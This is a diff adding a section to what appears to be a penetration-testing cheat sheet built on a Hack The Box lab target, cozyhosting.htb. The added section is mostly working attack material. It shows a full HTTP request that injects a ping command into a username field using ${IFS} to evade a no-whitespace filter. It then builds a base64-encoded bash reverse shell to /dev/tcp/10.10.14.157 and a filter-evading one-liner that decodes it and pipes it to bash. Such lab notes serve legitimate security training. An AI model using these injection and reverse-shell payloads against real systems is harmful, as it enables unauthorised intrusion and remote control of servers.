@@ -142,3 +142,35 @@ ffuf -request search.request --request-proto http -w /opt/Seclists/Fuzzing/speci
 ; | & == cmd injection
 ' " == SQLI
 ```
+
+### IFS Bypass No Spaces CmdInjection
+
+* whitespace bypass&#x20;
+
+```
+POST /executessh HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Origin: http://cozyhosting.htb
+Connection: close
+Referer: http://cozyhosting.htb/admin?error=Username%20can%27t%20contain%20whitespaces!
+Cookie: JSESSIONID=DB9090F5B00F1D06EBACD0FEB329530C
+Upgrade-Insecure-Requests: 1
+
+host=cozyhosting&username=;ping${IFS}-c4${IFS}10.10.14.157;#
+```
+
+* can see above that the username (our injection point) cannot contain spaces, we can use `{IFS}`to bypass this restriction and get cmd injection
+* Gaining a reverse shell, encode your payload and have it decode and execute to avoid special character issues&#x20;
+
+```
+echo "bash -i >& /dev/tcp/10.10.14.157/1234 0>&1" | base64 -w 0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvMTIzNCAwPiYxCg==
+// use this 
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvMTIzNCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+```
